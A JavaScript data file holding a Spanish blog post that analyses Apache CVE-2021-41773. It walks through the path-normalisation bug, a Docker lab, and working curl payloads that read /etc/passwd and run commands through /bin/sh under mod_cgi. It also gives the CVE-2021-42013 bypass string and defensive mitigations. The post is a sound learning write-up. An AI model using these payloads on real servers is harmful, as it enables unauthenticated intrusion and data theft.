var BLOG_POSTS = [
  {
    slug: "cve-2021-41773-apache-path-traversal-rce",
    title: "De CVE a PoC: diseccionando CVE-2021-41773 en Apache",
    date: "2026-10-02",
    category: "web",
    excerpt: "Apache 2.4.49 tuvo un path traversal que escalaba a RCE sin autenticación. En vez de bajar el exploit de GitHub, lo reconstruyo desde el advisory.",
    tags: ["web", "path-traversal", "rce", "cve-analysis", "apache"],
    content: `Hay una tentación constante cuando lees un CVE interesante: ir directo a Exploit-DB, copiar el PoC, lanzarlo contra tu lab y sentir que "ya lo entiendes". No lo entiendes. Solo sabes que funciona.

Así que esta vez hice el camino largo con **CVE-2021-41773**, el path traversal de Apache HTTP Server 2.4.49 que en ciertas condiciones escala a ejecución remota de comandos sin autenticar. Es un CVE de 2021, parcheado hace años, pero sigue siendo uno de los mejores ejemplos de cómo un "refactor de rendimiento" puede abrir un agujero gigante en una pieza de software que lleva décadas en producción.

## Por qué este y no otro

Lo elegí por tres motivos muy concretos:

- El CWE es cristalino: \`CWE-22\` (path traversal) con una vía de escalada directa a \`CWE-78\` (inyección de comandos) si tienes \`mod_cgi\` activo.
- Solo afecta a **una versión exacta**, la 2.4.49. Eso significa que puedo clavar el entorno de pruebas sin pelearme con variaciones de comportamiento entre versiones.
- Está en el catálogo KEV de CISA — se explotó en producción de verdad, no es un hallazgo de laboratorio sin impacto real.

## Leer el advisory en vez de pasar de largo

El texto oficial de Apache dice, básicamente, que un cambio en la normalización de rutas rompió la protección contra \`../\`. Lo que no dice tan claramente —y es lo que de verdad importa aquí— es *por qué* se rompió.

Apache había tocado \`ap_normalize_path()\` para hacerla más rápida. Al optimizar el recorrido de la ruta, se les quedó un caso sin cubrir: la decodificación de caracteres URL-encoded. Esto es un patrón que merece la pena memorizar para cualquier auditoría de código que hagas en el futuro: **cuando alguien toca una función de normalización de rutas "para rendimiento", esa función se convierte en sospechosa número uno hasta que se demuestre lo contrario.**

## El bug, en plata

El normalizador recorre la URI colapsando secuencias tipo \`/./\` y \`/../\`. El fallo está en el orden de operaciones: si metes un segmento que *decodifica* a \`.\` después de que el check de traversal ya haya hecho su pasada, pero antes de que la ruta se resuelva físicamente contra el filesystem, te saltas el filtro entero.

La secuencia que dispara esto es esta:

\`\`\`
/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
\`\`\`

\`%2e\` es un \`.\` codificado en URL. La cadena \`.%2e/\` decodifica a \`../\` **después** de que el normalizador ya validó la cadena cruda, sin decodificar. Es el clásico TOCTOU de parsing: validas una representación del input y actúas sobre otra completamente distinta. Si has visto algún path traversal en IIS o en un Nginx mal configurado, el género del bug te va a sonar — el encoding es solo el vehículo, nunca la causa raíz.

## Montando el lab

Nada de instalar Apache a pelo en tu máquina. Docker y listo:

\`\`\`bash
docker run -d --name apache-vuln -p 8080:80 httpd:2.4.49
curl -I http://localhost:8080
# Server: Apache/2.4.49 (Unix)
\`\`\`

Para la parte interesante (la escalada a RCE) necesitas \`mod_cgi\` cargado y un script accesible bajo \`/cgi-bin/\`:

\`\`\`bash
docker exec -it apache-vuln bash
echo "LoadModule cgid_module modules/mod_cgid.so" >> /usr/local/apache2/conf/httpd.conf
echo "ScriptAlias /cgi-bin/ /usr/local/apache2/cgi-bin/" >> /usr/local/apache2/conf/httpd.conf
printf '#!/bin/sh\\necho "Content-Type: text/plain"\\necho ""\\necho "cgi alive"\\n' > /usr/local/apache2/cgi-bin/test.sh
chmod +x /usr/local/apache2/cgi-bin/test.sh
\`\`\`

Reinicia el servidor y confirma que \`/cgi-bin/test.sh\` responde antes de seguir. Si esa base no funciona, todo lo que venga después te va a generar ruido sin sentido — comprueba siempre el estado "sano" primero.

## Fase 1: sacar un fichero que no deberías poder ver

\`\`\`bash
curl -s --path-as-is \\
  "http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
\`\`\`

El \`--path-as-is\` no es decorativo: sin él, \`curl\` normaliza la URI él solito antes de mandarla, y te carga el PoC sin que te enteres de por qué no funciona. Si ves el contenido de \`/etc/passwd\`, ya tienes disclosure confirmado — y eso, solo, ya es un hallazgo de severidad alta.

## Fase 2: de leer ficheros a ejecutar comandos

Aquí está la parte que convierte esto en crítico. Si el traversal apunta a un **binario del sistema** en vez de a un fichero estático, y la petición cae bajo el handler de \`mod_cgi\`, Apache lo ejecuta como si fuera un script CGI — pasándole variables de entorno derivadas de tus headers HTTP.

\`\`\`bash
curl -s --path-as-is \\
  -d "echo Content-Type: text/plain; echo; id" \\
  "http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
\`\`\`

Lo que pasa paso a paso:

1. El traversal te saca de \`cgi-bin/\` y te deja en \`/bin/sh\`.
2. \`mod_cgi\` interpreta la petición como ejecución CGI, porque la ruta cae bajo el \`ScriptAlias\` configurado.
3. \`/bin/sh\` se ejecuta como proceso CGI real.
4. El body del POST llega por **stdin** al shell — por eso los comandos van ahí y no en la query string.

Con el entorno bien montado, la respuesta trae la salida de \`id\`. Eso es RCE no autenticado, desde cero, sin copiar nada de nadie.

## El detalle que de verdad vale la pena recordar

Apache sacó el parche en la 2.4.50 el 4 de octubre de 2021. Tres días después ya había un bypass público (**CVE-2021-42013**). ¿Por qué falló tan rápido un parche "oficial"?

Porque seguía sin canonicalizar la ruta por completo tras un segundo nivel de decodificación. Doble-codificas parcialmente y el filtro se vuelve a saltar:

\`\`\`
/.%%32%65/.%%32%65/.%%32%65/etc/passwd
\`\`\`

Esta es la lección que me llevo para cualquier auditoría futura: **un parche puntual sobre una función de parsing, sin reescribirla con una validación estricta y canonicalización completa, hay que tratarlo como provisional hasta que se demuestre lo contrario.** El fix de verdad no llegó hasta la 2.4.51, con una reescritura real del normalizador que decodifica y canonicaliza de forma iterativa hasta agotar las secuencias, en vez de hacer una sola pasada.

Esa es la diferencia entre *tapar el PoC que te enseñaron* y *cerrar la clase de bug entera*.

## Mitigación, para el lado blue team

- **WAF/regex** sobre secuencias \`%2e\` o \`%%32%65\` repetidas en el path, sobre todo dirigidas a \`/cgi-bin/\` — esto tapa síntomas, no la causa, pero gana tiempo.
- \`Require all denied\` por defecto en el document root, abriendo solo lo estrictamente necesario, limita el blast radius del disclosure aunque no arregle el bug.
- Si no usas \`mod_cgi\`, desactívalo. Reduces de un plumazo toda esta clase de escalada.
- Estas peticiones suelen dejar ráfagas de 400/403 en los logs antes de que alguien dé con la combinación correcta — correlar esos códigos contra \`/cgi-bin/\` es una detección barata y efectiva.

## Nota legal

Todo esto se reprodujo en un contenedor Docker aislado, contra una versión de Apache pública y documentada como vulnerable desde hace más de tres años, sin tocar ningún sistema de terceros.`
  }
];
